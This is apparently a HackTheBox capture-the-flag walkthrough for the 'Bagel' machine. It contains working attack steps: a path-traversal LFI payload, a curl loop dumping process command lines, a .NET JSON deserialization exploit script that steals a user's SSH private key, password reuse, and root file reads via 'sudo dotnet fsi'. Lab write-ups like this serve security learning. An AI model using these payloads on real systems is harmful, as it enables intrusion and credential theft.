# Bagel

Difficulty: Medium
Status: Done
URL: https://app.hackthebox.com/machines/530

Starting with nmap scan per usual:

```bash
┌──(kali㉿kali)-[~/hackthebox/Bagel]
└─$ nmap -sC -sV -p- -oN nmap/bagel-tcp 10.129.160.199
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 11:59 EST
Nmap scan report for 10.129.160.199
Host is up (0.046s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
|_  256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 21 Feb 2023 16:59:37 GMT

[...SNIP...]

|_    <h1>Bad Request (Invalid request line (version).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9

[...SNIP...]

|_    </html>
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9

[...SNIP...]

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.65 seconds
```

### Port 22

Here nothing can be gathered, not even the version of Linux distro running since the banner doesnt show anything except OpenSSH 8.8 which could point to ubuntu Jammy build (Only wild guess)

- Source → [https://launchpad.net/ubuntu/+source/openssh/1:8.8p1-1](https://launchpad.net/ubuntu/+source/openssh/1:8.8p1-1)

### Port 5000

Seems like some kind of application is running on this port, doesn’t show any web page but by using netcat we can see some interesing information:

```bash
┌──(kali㉿kali)-[~/hackthebox/Bagel]
└─$ nc 10.129.160.199 5000
?
HTTP/1.1 400 Bad Request
Content-Type: text/html
Server: Microsoft-NetCore/2.0
Date: Tue, 21 Feb 2023 17:16:49 GMT
Content-Length: 52
Connection: close
Keep-Alive: true

<h1>Bad Request (Invalid request line (parts).)</h1>
```

By giving it any kind of input it shows only Bad Request error with one interesting HTTP Header that is Server which has a value of “Microsoft-NetCore/2.0”.

> *“.NET Core is a powerful software framework that helps developers create apps quickly and easily. Microsoft developed this framework as a cross-platform successor to the .NET Framework.”*
> 

> *“Although popular among developers, the original .Net Framework was limited because it was designed specifically for Windows. Microsoft created .NET Core to address this limitation by allowing developers to create apps that people could use on any device, including mobile devices.”*
> 

Seems like pretty much a .NET made for every platform so it is not only limited to Windows development.

So far all vulnerabilities I managed to find were some kind of privilege escalation attack vectors which leads me to believe that it might be something we exploit later on.

### Port 8000

When accessing it over a web we get a redirect to bagel.htb:8000/?page=index.html which we can add to /etc/hosts file.

### LFI

Page parameter is vulnerable to an Local File Inclusion attack and PoC can be made just by navigating here:

bagel.htb:8000/?page=../../../../../../../../../../etc/passwd

Here we manage to downlaod the passwd file from the system and we can already see some users on it.

```bash
┌──(kali㉿kali)-[~/hackthebox/Bagel/LFI-Downloads]
└─$ cat passwd | grep sh
root:x:0:0:root:/root:/bin/bash
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

Most of the LFI payloads and files I tried extracting didn’t lead to anything important/interesting. So I tried seeing what process is currently being runned. I did this by checking the /proc/self/cmdline file which showed me this.

```bash
python3/home/developer/app/app.py
```

So this is probably the application file for the currently running web application which would make sense since it is a Werkzeug which means python. Downloading this file through the LFI we can see the code that is running all this:

```python
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```

At first I wasn’t sure what to do with this but first part was code that was vulnerable to the LFI so nothing there but the orders part shows how it uses the service on port 5000 that is running dotnet which we discoverd previously.

So after google-ing a bit and testing it seems that it is creating a websocket and sending the query information for orders in JSON format so in the end pretty simple.

But most interesting part is the comment that says:

```python
# don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
```

This leads me to believe that we somehow need to find this dotnet app and this is probably an already running app since we managed to use it through the previous websocket it must be a running process so lets enumerate /proc/{id}/cmdline of all processes and hopefully find the dotnet app.

To simplify the process for myself i made a short and messy bash script to read every cmdline from every process and output it to a file:

```bash
for i in {0..9999}; do curl "http://bagel.htb:8000/?page=../../../../../../../../../../../proc/$i/cmdline" >> output.txt; echo "\n" >> output.txt; done
```

- probably can be simpler but i didn’t want to spend too much on it 😛

Next the output had many blank lines and “File not found” junk and i removed it with 2 simple sed commands:

```bash
1. sed -i '/^$/d' output.txt
2. sed -i '/^File not found$/d' output.txt
```

Now the results are much mcuh cleaner and we have a file full of process paths and commands:

```bash
/usr/lib/systemd/systemdrhgb--switched-root--system--deserialize35
/usr/lib/systemd/systemdrhgb--switched-root--system--deserialize35
/usr/local/sbin/laurel--config/etc/laurel/config.toml
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
python3/home/developer/app/app.py
/usr/lib/polkit-1/polkitd--no-debug
/usr/bin/dbus-broker-launch--scopesystem--audit
/usr/sbin/rsyslogd-n
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
/usr/sbin/abrtd-d-s
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
dbus-broker--log4--controller9--machine-idce8a2667e5384602a9b46d6ad7614e92--max-bytes536870912--max-fds4096--max-matches131072--audit
/usr/sbin/NetworkManager--no-daemon
sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
/usr/lib/polkit-1/polkitd--no-debug
/usr/lib/polkit-1/polkitd--no-debug
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
/usr/sbin/atd-f
/usr/sbin/crond-n
/sbin/agetty-o-p -- \u--noclear-linux

[...SNIP...]
```

I have cut out alot of info from the output file for the sake of visibility and simplicity, now let’s try to download that file through the LFI.

To download the file the path dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll didnt won’t to download the dll file so I had to remove the dotnet part from it and only leave /opt/bagel/bin/Debug/net6.0/bagel.dll.

Checking out the file we can obviously see that it is .net PE32 executable:

```bash
┌──(kali㉿kali)-[~/hackthebox/Bagel]
└─$ file bagel.dll                     
bagel.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

I downloaded the file over to my windows machine and opened it in dnSpy to reverse engineer it.

Pretty odd output that I wasn’t really expecting to see:

![Untitled](Bagel%2067ae90c415644ec890a90d5b2169a20b/Untitled.png)

After getting stuck on this part for a longer time, it just didn’t make sense that there was only “Hello, World!” in the dll and i tried downloading again and ofcourse the bagel.dll now is different and has many other functions (don’t know how that is possible and how it happened).

![Untitled](Bagel%2067ae90c415644ec890a90d5b2169a20b/Untitled%201.png)

Looking at the functions I found an interesting user:pass for connecting to the databse in the DB_connection() function:

![Untitled](Bagel%2067ae90c415644ec890a90d5b2169a20b/Untitled%202.png)

SSH didn’t work on any user but seems like a good idea to reuse that password and enumerate database when I get access to the machine.

Looking around for other functions I get to the interesting Handler part for receiving messages that uses two interesting functions which are:

- Serialize() and Deserialize()

This instantly comes to my mind tha there is a deserialization attack.

![Untitled](Bagel%2067ae90c415644ec890a90d5b2169a20b/Untitled%203.png)

We can also notice in the Deserialize(json) function that is uses that json format for previously found Orders:

![Untitled](Bagel%2067ae90c415644ec890a90d5b2169a20b/Untitled%204.png)

Okay so looking at this we can probably read different file that the orders.txt we can do this because of the deserialization of the .net core. This can be done by nesting another json object inside of the initial one and to look where can we “nest” it we can see that initial Base class inherits from Orders:

![Untitled](Bagel%2067ae90c415644ec890a90d5b2169a20b/Untitled%205.png)

In orders only function that accepts an object as an argument is RemoveOrder(object) so we can give it another object which is basically ReadOrder() setter function.

![Untitled](Bagel%2067ae90c415644ec890a90d5b2169a20b/Untitled%206.png)

In ReadOrder() function we can check and see that the file it reads is of type File which is also another class put inside of a namespace called bagel_server. So to put all of this together we would get an payload looking like this:

```json
{ "RemoveOrder" : {"$type": "bagel_server.File, bagel", "ReadFile":"[...INSERT FILE HERE...]"}}
```

- Most of the info was found here for the “$type” stuff:
- [https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15](https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15)

I will do it the way the creator did in app.py file to connect to the port 5000 through python WebSocket and send the payload that way and try to read ssh key from user phil.

```python
import json
import websocket

ws = websocket.WebSocket()
ws.connect("ws://10.10.11.201:5000/")
order = { "RemoveOrder" : {"$type": "bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(json.loads(result))
```

![Untitled](Bagel%2067ae90c415644ec890a90d5b2169a20b/Untitled%207.png)

I was able to extract the private ssh key for a user phil but output is messy so lets fix it by copying the private key to a id_rsa file and editing with vim, next type this command to replace all the occurances of “\n” with the newline.

```
:%s/\\n/\r/g
```

After that we finally get access to the system as user phil.

```bash
┌──(kali㉿kali)-[~/hackthebox/Bagel]
└─$ sudo ssh -i id_rsa phil@bagel.htb
[sudo] password for kali: 
Last login: Thu Feb 23 19:12:25 2023 from 10.10.14.5
[phil@bagel ~]$ ls
user.txt
```

Now i know there was a password in the source of the bagel.dll for user “dev” so lets try it now.

```bash
[phil@bagel ~]$ su developer
Password: 
[developer@bagel ~]$
```

And it does we now moved horizontally on the system.

Running the “sudo -l” command to see if we can run something as root and it shows us that we can run dotnet as root.

```bash
[developer@bagel ~]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

After googling around for endless hours finally managed to understand what is happening :))))

So since as developer user we can run dotnet as root I was able to stubmle upon a F#(fsharp) scripting language that is basically an interactive language for dotnet and after trying and searching for hours I was able to read any file root user owns. You could probably make a reverse shell or even execute system commands but I might look into that some other day.

To start an interactive fsi we run this command:

```bash
[developer@bagel phil]$ sudo dotnet fsi
```

After that you can now type and execute dotnet code and then type following commands to read any file:

```bash
> open System.IO;;                                                                                                                                                                           
> open System;;
> let sr = new StreamReader("/root/root.txt");;
val sr: StreamReader

> Console.WriteLine(sr.ReadToEnd());;
[root.txt] <- Hidden flag displayed here
```

Resources that helped for root part:

- [https://learn.microsoft.com/en-us/dotnet/fsharp/tutorials/using-functions](https://learn.microsoft.com/en-us/dotnet/fsharp/tutorials/using-functions)
- [https://learn.microsoft.com/en-us/dotnet/standard/io/how-to-read-text-from-a-file](https://learn.microsoft.com/en-us/dotnet/standard/io/how-to-read-text-from-a-file)

Root part took a long sitting until I figured a bit of F# and how dotnet work on linux environment but pretty fun box, you can easily get stuck on many routes but carefully observed environment and logic can lead you to right path.